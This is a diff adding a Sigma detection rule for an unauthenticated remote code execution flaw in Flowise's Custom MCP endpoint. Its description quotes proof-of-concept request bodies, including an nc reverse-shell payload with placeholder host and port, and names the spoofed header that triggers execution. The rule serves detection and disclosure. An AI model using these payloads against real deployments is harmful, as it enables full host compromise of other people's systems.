@@ -1,0 +1,71 @@
+title: Flowise Custom MCP -- T1059 x-request-from header spoof unsandboxed RCE
+id: 21f85004-8415-4d75-8fe1-004eb9dfcd1e
+status: experimental
+description: |
+  Vendor-disclosed detection for CVE-2025-71336 (GHSA-6933-jpx5-q87q,
+  CVSS 9.3 CRITICAL), a self-reported advisory for Flowise, an
+  enhanced ChatGPT-clone / low-code AI-agent builder.
+
+  Prior to 3.0.6, Flowise's Custom MCP feature -- designed to execute OS
+  commands to launch local MCP servers -- was reachable without
+  authentication (the default installation runs unauthenticated unless
+  `FLOWISE_USERNAME`/`FLOWISE_PASSWORD` are explicitly set) by sending a
+  crafted request carrying the header `x-request-from: internal` to
+  `POST /api/v1/node-load-method/customMCP`. The request body's
+  `mcpServerConfig.command`/`args` fields are executed directly as an OS
+  process. Publicly documented PoC payloads (VulnCheck) demonstrate both a
+  file-write probe (`{"inputs":{"mcpServerConfig":{"command":"touch",
+  "args":["/tmp/yofitofi"]}},"loadMethod":"listActions"}`) and a reverse
+  shell (`{"inputs":{"mcpServerConfig":{"command":"nc","args":["<IP>",
+  "<PORT>","-e","/bin/sh"]}},"loadMethod":"listActions"}`) -- complete
+  container/host compromise from a single unauthenticated HTTP request.
+
+  Detection logic flags exactly this combination: a POST to the
+  `customMCP` node-load-method endpoint carrying the internal-request
+  spoof header, whose body's `mcpServerConfig.command` field names an
+  arbitrary-execution-capable binary rather than a fixed, allow-listed MCP
+  server launcher.
+
+  Aggregated from 2 independent technical sources (FlowiseAI's own GHSA
+  advisory + VulnCheck's corroborating PoC write-up with the payloads
+  quoted above), fixed in 3.0.6.
+references:
+- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-6933-jpx5-q87q
+- https://www.vulncheck.com/advisories/flowise-unsandboxed-remote-code-execution-via-custom-mcp
+- https://attack.mitre.org/techniques/T1059/
+author: WinstonRedGuard -- sigma plugin observed rules (derived from breach corpus)
+date: '2026-08-11'
+logsource:
+  category: webserver
+  product: ""
+detection:
+  selection_custommcp_endpoint:
+    cs-uri-stem|contains: /api/v1/node-load-method/customMCP
+  selection_internal_spoof_header:
+    cs(x-request-from): internal
+  selection_method_post:
+    cs-method: POST
+  condition: selection_custommcp_endpoint and selection_internal_spoof_header and selection_method_post
+falsepositives:
+- A deployment already upgraded to 3.0.6+, where the endpoint no longer
+  trusts the `x-request-from` header for internal-request classification
+  -- a matching request on a fixed deployment reflects a rejected attempt,
+  not successful exploitation
+- Legitimate internal service-to-service calls that happen to set this
+  header for unrelated reasons on an unpatched deployment -- if the log
+  source can capture the request body, correlate with a
+  `mcpServerConfig.command` value outside a known-safe allow-list to
+  confirm exploitation rather than routine internal traffic
+- Pattern library v1 -- review for environment-specific tuning before
+  deployment
+level: critical
+tags:
+- attack.t1059
+- wrg.observed.cve.cve_2025_71336
+- wrg.observed.source.flowiseai_ghsa_6933_jpx5_q87q
+- wrg.observed.source.vulncheck_corroboration
+- wrg.observed.vector.internal_request_header_spoof
+- wrg.observed.vector.mcp_config_command_injection
+- wrg.severity.critical
+- wrg.observed
+- wrg.tactic.execution
